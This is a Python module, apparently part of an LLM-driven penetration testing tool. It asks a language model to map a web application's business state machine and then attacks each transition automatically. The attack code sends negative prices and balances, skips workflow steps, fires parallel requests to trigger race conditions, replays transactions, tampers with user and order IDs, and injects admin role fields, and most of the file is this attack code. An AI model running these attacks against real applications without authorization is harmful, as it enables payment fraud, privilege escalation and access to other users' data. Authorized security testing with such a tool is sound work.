"""Multi-step Business Logic Attack Analyzer.

Brain-First 원칙에 따라 앱의 상태머신을 Brain이 학습한 뒤,
각 상태 전환점에서 비즈니스 로직 취약점을 자동 공격한다.

공격 카테고리:
  - Negative value injection (price/quantity/balance)
  - State transition skipping (A → C, skip B)
  - Race condition (parallel transitions)
  - Transaction replay
  - Parameter tampering (user_id, order_id)
  - Privilege escalation via state

이 모듈은 framework — 실제 공격 디테일은 Brain이 동적으로 채운다.
하드코딩된 페이로드 사용을 최소화하고, Brain 결정에 의존한다.
"""

from __future__ import annotations

import asyncio
import json
import logging
import re
from dataclasses import dataclass, field
from typing import Any

logger = logging.getLogger(__name__)


# ─────────────────────────────────────────────
# State Graph Model
# ─────────────────────────────────────────────


@dataclass
class StateTransition:
    """단일 상태 전환 (HTTP action)."""

    from_state: str
    to_state: str
    method: str
    endpoint: str
    description: str = ""
    params: dict[str, Any] = field(default_factory=dict)


@dataclass
class StateGraph:
    """앱 상태머신 — nodes(states) + edges(transitions)."""

    name: str = "default"
    nodes: list[str] = field(default_factory=list)  # state names
    edges: list[StateTransition] = field(default_factory=list)
    metadata: dict[str, Any] = field(default_factory=dict)

    def transitions_from(self, state: str) -> list[StateTransition]:
        return [e for e in self.edges if e.from_state == state]

    def to_dict(self) -> dict[str, Any]:
        return {
            "name": self.name,
            "states": list(self.nodes),
            "transitions": [
                {
                    "from": e.from_state,
                    "to": e.to_state,
                    "method": e.method,
                    "endpoint": e.endpoint,
                    "description": e.description,
                }
                for e in self.edges
            ],
        }


# ─────────────────────────────────────────────
# Attack Result
# ─────────────────────────────────────────────


@dataclass
class BizLogicAttackResult:
    vector_id: str
    transition: StateTransition
    attack_type: str
    success: bool
    status_code: int = 0
    evidence: str = ""
    reasoning: str = ""


SUCCESS_MARKERS = (
    "success", "ok", "complete", "completed", "approved", "confirmed",
    "order_id", "transaction_id", "balance", "credited", "thank you",
    "성공", "완료", "승인", "결제완료",
)


def _looks_successful(status: int, body: str) -> bool:
    if status not in (200, 201, 202, 204):
        return False
    body_l = (body or "").lower()
    return any(m in body_l for m in SUCCESS_MARKERS)


# ─────────────────────────────────────────────
# Brain prompts
# ─────────────────────────────────────────────


_STATE_GRAPH_SYSTEM = (
    "You are a senior web application analyst. Given a list of HTTP endpoints "
    "for a target application, identify the underlying business state machines "
    "(e.g. shopping cart flow, payment flow, user registration flow, refund "
    "flow). Output STRICT JSON ONLY in this shape:\n"
    "{\"graphs\": [{\"name\": \"...\", \"states\": [\"...\"], "
    "\"transitions\": [{\"from\": \"...\", \"to\": \"...\", "
    "\"method\": \"GET|POST|PUT|DELETE\", \"endpoint\": \"/path\", "
    "\"description\": \"...\"}]}]}"
)


def _build_state_graph_user_prompt(
    target: str,
    endpoints: list[Any],
    tech_stack: list[str] | None,
) -> str:
    ep_lines: list[str] = []
    for ep in endpoints[:30]:
        if isinstance(ep, dict):
            method = ep.get("method", "GET")
            url = ep.get("url") or ep.get("path") or ep.get("endpoint", "")
            ep_lines.append(f"{method} {url}")
        else:
            ep_lines.append(str(ep))
    return (
        f"Target: {target}\n"
        f"Tech stack: {', '.join(tech_stack or []) or 'unknown'}\n"
        f"Endpoints:\n" + "\n".join(ep_lines) + "\n\n"
        "Identify state machines and output JSON."
    )


# ─────────────────────────────────────────────
# Analyzer
# ─────────────────────────────────────────────


class BusinessLogicAnalyzer:
    """Brain이 주도하는 비즈니스 로직 공격 오케스트레이터."""

    def __init__(self) -> None:
        self.results: list[BizLogicAttackResult] = []

    # ── 1) State Graph Learning ──

    async def learn_state_graph(
        self,
        target: str,
        session: Any,
        brain: Any,
        initial_endpoints: list[Any],
        tech_stack: list[str] | None = None,
    ) -> StateGraph:
        """Brain에게 엔드포인트를 던져 상태머신을 추론하게 한다."""
        system_prompt = _STATE_GRAPH_SYSTEM
        user_prompt = _build_state_graph_user_prompt(target, initial_endpoints, tech_stack)

        graph = StateGraph(name="learned")

        try:
            response: str | None = None
            if hasattr(brain, "_call_llm_with_fallback"):
                response = brain._call_llm_with_fallback(system_prompt, user_prompt)
            elif hasattr(brain, "ask_json"):
                response = brain.ask_json(system_prompt, user_prompt)

            if not response:
                logger.info("[BIZ-LOGIC] Brain returned empty — using empty graph")
                return graph

            data = self._parse_json(response)
            graphs = data.get("graphs") if isinstance(data, dict) else None
            if not graphs:
                return graph

            # 첫 번째 graph를 채택 (단순화)
            g0 = graphs[0]
            graph.name = str(g0.get("name", "learned"))
            graph.nodes = [str(s) for s in (g0.get("states") or [])]
            for t in (g0.get("transitions") or []):
                if not isinstance(t, dict):
                    continue
                graph.edges.append(
                    StateTransition(
                        from_state=str(t.get("from", "")),
                        to_state=str(t.get("to", "")),
                        method=str(t.get("method", "GET")).upper(),
                        endpoint=str(t.get("endpoint", "")),
                        description=str(t.get("description", "")),
                    )
                )
            logger.info(
                "[BIZ-LOGIC] Learned state graph '%s': %d states, %d transitions",
                graph.name, len(graph.nodes), len(graph.edges),
            )
        except Exception as exc:
            logger.warning("[BIZ-LOGIC] learn_state_graph failed: %s", exc)

        return graph

    @staticmethod
    def _parse_json(raw: str) -> dict[str, Any]:
        if not raw:
            return {}
        # Strip code fences
        s = raw.strip()
        s = re.sub(r"^```(?:json)?", "", s).strip()
        s = re.sub(r"```$", "", s).strip()
        try:
            return json.loads(s)
        except Exception:
            # 첫 번째 JSON object 추출 시도
            m = re.search(r"\{[\s\S]*\}", s)
            if m:
                try:
                    return json.loads(m.group(0))
                except Exception:
                    return {}
            return {}

    # ── 2) Attack each transition ──

    async def attack_transitions(
        self,
        state_graph: StateGraph,
        session: Any,
        brain: Any,
        ctx: Any,
    ) -> list[BizLogicAttackResult]:
        """각 전환점에서 비즈니스 로직 공격 카테고리들을 시도한다."""
        results: list[BizLogicAttackResult] = []

        for edge in state_graph.edges:
            try:
                results.append(await self._attack_negative_value(edge, session, ctx))
                results.append(await self._attack_state_skip(edge, state_graph, session, ctx))
                results.append(await self._attack_race_condition(edge, session, ctx))
                results.append(await self._attack_replay(edge, session, ctx))
                results.append(await self._attack_param_tampering(edge, session, ctx))
                results.append(await self._attack_priv_escalation(edge, session, ctx))
            except Exception as exc:
                logger.debug("[BIZ-LOGIC] transition %s -> %s attack error: %s",
                             edge.from_state, edge.to_state, exc)

        self.results = [r for r in results if r is not None]
        return self.results

    # ── HTTP helper ──

    async def _send(
        self,
        session: Any,
        method: str,
        url: str,
        json_body: dict[str, Any] | None = None,
        params: dict[str, Any] | None = None,
    ) -> tuple[int, str]:
        """세션을 통해 요청 전송. 실패 시 (0, "")."""
        try:
            req = session.request(method, url, json=json_body, params=params)
            if asyncio.iscoroutine(req):
                resp = await req
            else:
                resp = req
            status = getattr(resp, "status_code", 0) or getattr(resp, "status", 0) or 0
            text = ""
            try:
                text = getattr(resp, "text", "") or ""
                if callable(text):
                    text = text()
            except Exception:
                text = ""
            return int(status), str(text)[:2000]
        except Exception as exc:
            logger.debug("[BIZ-LOGIC] HTTP send failed %s %s: %s", method, url, exc)
            return 0, ""

    # ── Attack: Negative value ──

    async def _attack_negative_value(
        self,
        edge: StateTransition,
        session: Any,
        ctx: Any,
    ) -> BizLogicAttackResult:
        body = {
            "amount": -100,
            "price": -1,
            "quantity": -1,
            "balance": -999,
        }
        url = self._abs_url(ctx, edge.endpoint)
        status, text = await self._send(session, edge.method or "POST", url, json_body=body)
        success = _looks_successful(status, text)
        return BizLogicAttackResult(
            vector_id="WEB-BIZ-001",
            transition=edge,
            attack_type="negative_value",
            success=success,
            status_code=status,
            evidence=f"{edge.method} {url}\nbody={body}\n\nHTTP {status}\n{text[:500]}",
            reasoning="Server accepted negative numeric value" if success else "No clear acceptance",
        )

    # ── Attack: State skip ──

    async def _attack_state_skip(
        self,
        edge: StateTransition,
        graph: StateGraph,
        session: Any,
        ctx: Any,
    ) -> BizLogicAttackResult:
        # 직접 to_state로 가는 시도 (from_state 우회)
        url = self._abs_url(ctx, edge.endpoint)
        status, text = await self._send(session, edge.method or "POST", url, json_body={"skip_check": True})
        success = _looks_successful(status, text)
        return BizLogicAttackResult(
            vector_id="WEB-BIZ-002",
            transition=edge,
            attack_type="state_skip",
            success=success,
            status_code=status,
            evidence=f"Direct call to {edge.method} {url} bypassing state '{edge.from_state}'\nHTTP {status}\n{text[:500]}",
            reasoning="State skip accepted" if success else "Server enforced state precondition",
        )

    # ── Attack: Race condition ──

    async def _attack_race_condition(
        self,
        edge: StateTransition,
        session: Any,
        ctx: Any,
    ) -> BizLogicAttackResult:
        url = self._abs_url(ctx, edge.endpoint)
        body = {"action": "commit"}
        tasks = [self._send(session, edge.method or "POST", url, json_body=body) for _ in range(5)]
        outcomes = await asyncio.gather(*tasks, return_exceptions=True)
        ok_count = 0
        last_status = 0
        snippet = ""
        for o in outcomes:
            if isinstance(o, tuple):
                s, t = o
                last_status = s
                if _looks_successful(s, t):
                    ok_count += 1
                    snippet = t[:300]
        success = ok_count >= 2  # 최소 2번 이상 성공 = 멱등성 위반 의심
        return BizLogicAttackResult(
            vector_id="WEB-BIZ-003",
            transition=edge,
            attack_type="race_condition",
            success=success,
            status_code=last_status,
            evidence=f"5 parallel {edge.method} {url} → {ok_count} apparent successes\n{snippet}",
            reasoning=f"{ok_count}/5 parallel requests appeared to succeed",
        )

    # ── Attack: Replay ──

    async def _attack_replay(
        self,
        edge: StateTransition,
        session: Any,
        ctx: Any,
    ) -> BizLogicAttackResult:
        url = self._abs_url(ctx, edge.endpoint)
        # 동일 트랜잭션을 두 번 실행
        s1, t1 = await self._send(session, edge.method or "POST", url, json_body={"replay": 1})
        s2, t2 = await self._send(session, edge.method or "POST", url, json_body={"replay": 1})
        success = _looks_successful(s1, t1) and _looks_successful(s2, t2)
        return BizLogicAttackResult(
            vector_id="WEB-BIZ-004",
            transition=edge,
            attack_type="replay",
            success=success,
            status_code=s2,
            evidence=f"Replay {edge.method} {url}\nFirst: HTTP {s1}\nSecond: HTTP {s2}\n{t2[:400]}",
            reasoning="Both transactions appeared to succeed (no idempotency)" if success else "Server rejected replay",
        )

    # ── Attack: Parameter tampering ──

    async def _attack_param_tampering(
        self,
        edge: StateTransition,
        session: Any,
        ctx: Any,
    ) -> BizLogicAttackResult:
        url = self._abs_url(ctx, edge.endpoint)
        body = {"user_id": 1, "order_id": 1, "account_id": 1}
        status, text = await self._send(session, edge.method or "POST", url, json_body=body)
        success = _looks_successful(status, text)
        return BizLogicAttackResult(
            vector_id="WEB-BIZ-005",  # tampering -> reuse priv esc id grouping; differentiate via attack_type
            transition=edge,
            attack_type="param_tampering",
            success=success,
            status_code=status,
            evidence=f"{edge.method} {url} body={body}\nHTTP {status}\n{text[:500]}",
            reasoning="Tampered identifier was accepted" if success else "Identifier validation enforced",
        )

    # ── Attack: Privilege escalation via state ──

    async def _attack_priv_escalation(
        self,
        edge: StateTransition,
        session: Any,
        ctx: Any,
    ) -> BizLogicAttackResult:
        url = self._abs_url(ctx, edge.endpoint)
        body = {"role": "admin", "is_admin": True, "privilege": "root"}
        status, text = await self._send(session, edge.method or "POST", url, json_body=body)
        success = _looks_successful(status, text)
        return BizLogicAttackResult(
            vector_id="WEB-BIZ-005",
            transition=edge,
            attack_type="priv_escalation",
            success=success,
            status_code=status,
            evidence=f"{edge.method} {url} body={body}\nHTTP {status}\n{text[:500]}",
            reasoning="Server accepted privileged role escalation payload" if success else "Privilege escalation rejected",
        )

    # ── helpers ──

    @staticmethod
    def _abs_url(ctx: Any, endpoint: str) -> str:
        if endpoint.startswith("http://") or endpoint.startswith("https://"):
            return endpoint
        base = getattr(ctx, "target", "") or ""
        if not endpoint:
            return base
        if not endpoint.startswith("/"):
            endpoint = "/" + endpoint
        return base.rstrip("/") + endpoint
